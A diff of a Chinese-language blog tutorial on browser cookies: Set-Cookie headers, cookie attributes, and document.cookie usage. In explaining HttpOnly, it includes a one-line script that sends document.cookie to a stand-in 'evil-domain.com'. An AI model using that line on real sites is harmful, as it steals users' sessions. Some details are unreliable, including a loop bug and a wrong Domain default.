@@ -1,8 +1,8 @@
-#+TITLE:       浏览器环境
+#+TITLE:       JavaScript笔记--浏览器环境
 #+AUTHOR:      Pinvon
 #+EMAIL:       pinvon@Inspiron
 #+DATE:        2018-03-19 一
-#+URI:         /blog/%y/%m/%d/浏览器环境概述
+#+URI:         /blog/%y/%m/%d/javascript笔记--浏览器环境概述
 #+KEYWORDS:    <TODO: insert your keywords here>
 #+TAGS:        Web
 #+LANGUAGE:    en
@@ -272,14 +272,131 @@ history.go(): 移动到指定的页面. history.go(-1)相当于后退一步, his
 
 适用场景: 保存登录, 购物车等需要记录的信息, 保存用户的偏好设置, 记录和分析用户行为.
 
-不推荐用Cookie作为客户端的存储, 推荐使用Web storage API和IndexedDB.
+不推荐用Cookie作为客户端的存储, 因为它的容量只有 4KB, 推荐使用Web storage API和IndexedDB.
 
 Cookie包含的信息: 名字, 值, 到期时间, 所属域名(默认当前域名), 生效路径(默认当前网址)
 
-如, 用户访问网址www.example.com, 服务器在浏览器写入一个 Cookie. 这个Cookie 就会包含www.example.com这个域名, 以及根路径/. 这意味着, 这个Cookie对该域名的根路径和它的所有子路径都有效. 如果路径设为/forums, 那么这个Cookie只有在访问www.example.com/forums及其子路径时才有效. 以后, 浏览器一旦访问这个路径, 浏览器就会附上这段Cookie发送给服务器.
+如, 用户访问网址 www.example.com, 服务器向浏览器写入一个 Cookie(浏览器可以拒绝接受). 这个 Cookie 就会包含 www.example.com 这个域名以及根路径 /. 意思是这个Cookie对该域名的根路径和它的所有子路径都有效. 如果路径设为 /forums, 那么这个 Cookie 只有在访问 www.example.com/forums 及其子路径时才有效. 以后, 浏览器一旦访问这个路径, 浏览器就会附上这段 Cookie 发送给服务器.
 
-window.navigator.cookieEnabled: 浏览器是否接受Cookie
-document.cookie: 当前网页的Cookie
+window.navigator.cookieEnabled: 浏览器是否接受 Cookie
+document.cookie: 当前网页的 Cookie
+
+如果单个域名的 Cookie 超过了 4KB, 则超出部分将被忽略.
+
+浏览器的同源政策: 如果两个网址域名和端口相同, 就可以共享本地的 Cookie. 所以 http://example.com 可以读取 https://example.com 的 Cookie.
+
+** Cookie 与 HTTP 协议
+
+Cookie 由 HTTP 协议生成, 为 HTTP 协议服务.
+
+*** 生成 Cookie
+
+如果服务器想在浏览器保存 Cookie, 要在 HTTP 响应的信息头中, 加入 Set-Cookie 字段:
+#+BEGIN_SRC JavaScript
+HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+#+END_SRC
+这表示生成了两个 Cookie(每个浏览器为单个域名的 Cookie 数量和大小限制不同, 一般是不能超过 30 个 Cookie, 每个大小不超过 4KB), 第 1 个 Cookie 名为 yummy_cookie, 值为 choco.
+
+除了 Cookie 名称之外, 我们还可以设置许多其他属性.
+
+** Cookie 的属性
+
+*** Expires, Max-Age
+
+Expires: 指定 Cookie 的到期时间, 到期后浏览器不再保留该 Cookie; 它的值是 UTC 格式, 可以使用 Date.prototype.toUTCString() 进行格式转换. 注意, 这个时间以浏览器本地时间为准, 所以服务器不能依赖自己的时间来判断 Cookie 是否过期.
+
+Max-Age: 指定 Cookie 从现在开始可以存在的秒数.
+
+如果使用了 Cookie, 却未设置 Expires 或 Max-Age 属性, 则 Cookie 只在当前会话有效, 如果浏览器窗口关闭, 该 Cookie 就会被删除; 如果同时设置了 Expires 和 Max-Age 属性, 则 Max-Age 优先.
+
+*** Domain, Path
+
+Domain: 指定浏览器发出 HTTP 请求时, 哪些域名要附带这个 Cookie. 如果没有指定, 则浏览器默认将当前 URL 的一级域名作为 Domain 对应的值.
+
+Path: 指定当浏览器发出 HTTP 请求时, 哪些路径要附带这个 Cookie. 如: Path 属性的值是 /, 则 /docs 路径也会包含该 Cookie.
+
+*** Secure, HttpOnly
+
+Secure: 指定浏览器只有在 HTTPS 加密协议下, 才将该 Cookie 发送到服务器.
+
+HttpOnly: 指定该 Cookie 无法通过 JavaScript 脚本获取, 如: Document.cookie, XMLHttpRequest对象, Request API. 这样可以防止该 Cookie 被脚本读到. 只有浏览器发出 HTTP 请求时, 才会带上该 Cookie. 如果未指定该属性, 恶意脚本可以通过类似如下操作, 将当前网页的 Cookie 发到第三方服务器:
+#+BEGIN_SRC JavaScript
+(new Image()).src="http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+#+END_SRC
+
+*** 实例
+
+#+BEGIN_SRC JavaScript
+Set-Cookie: id=a2fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+#+END_SRC
+
+** 修改 Cookie
+
+如果服务器想要修改一个已经设置过了的 Cookie, 则必须至少匹配: Cookie 的 key, domain, path, secure 四个属性. 如, 原始的 Cookie 内容如下:
+#+BEGIN_SRC JavaScript
+Set-Cookie: key1=value1; domain=example.com; path=/blog
+#+END_SRC
+
+正确的改法:
+#+BEGIN_SRC JavaScript
+Set-Cookie: key1=value2; domain=example.com; path=/blog
+#+END_SRC
+
+错误的改法:
+#+BEGIN_SRC JavaScript
+Set-Cookie: key1=value2; domain=example.com; path=/
+#+END_SRC
+
+由于改错了, 导致又生成了一个新的 Cookie, 所以当下一次访问 example.com/blog 时, 会发送两个 Cookie, 这两个 Cookie 的名称相同:
+#+BEGIN_SRC JavaScript
+Cookie: key1=value1; key1=value2
+#+END_SRC
+
+注意, Cookie 名是 key1, 名有值, 值是 value1, value2.
+
+** document.cookie
+
+如果 Cookie 没有 HttpOnly 属性, 则可以通过 document.cookie 来读写当前网页的 Cookie.
+
+如果当前的网页有 key 分别为 foo 和 baz 的两个 Cookie, 则 document.cookie 会将它们都读取出来:
+#+BEGIN_SRC JavaScript
+document.cookie  // "foo=bar;baz=bar"
+var cookies = document.cookie.split(';');
+for (var i=0; i<cookie.length; i++) {
+	console.log(cookies[i]);
+}
+// foo=bar
+// baz=bar
+#+END_SRC
+
+document.cookie 还可以写入 Cookie:
+#+BEGIN_SRC JavaScript
+document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";
+
+// 或者
+document.cookie = 'fontSize=14; '
+  + 'expires=' + someDate.toGMTString() + '; '
+  + 'path=/subdirectory; '
+  + 'domain=*.example.com';
+#+END_SRC
+注意, Cookie 中的 = 两边不能有空格.
+
+** 删除 Cookie
+
+只有一个办法删除 Cookie, 那就是把它的 Expires 属性设为一个过去的日期.
+
+** 发送 Cookie
+
+浏览器向服务器发送 HTTP 请求时, 每个请求都会自动带上相应的 Cookie(如果有的话). 即, 把服务器保存在浏览器的信息又发回给了服务器. 如:
+#+BEGIN_SRC JavaScript
+GET /sample_page.html HTTP/1.1
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+#+END_SRC
+这里发送了两个 Cookie.
 
 * AJAX
 
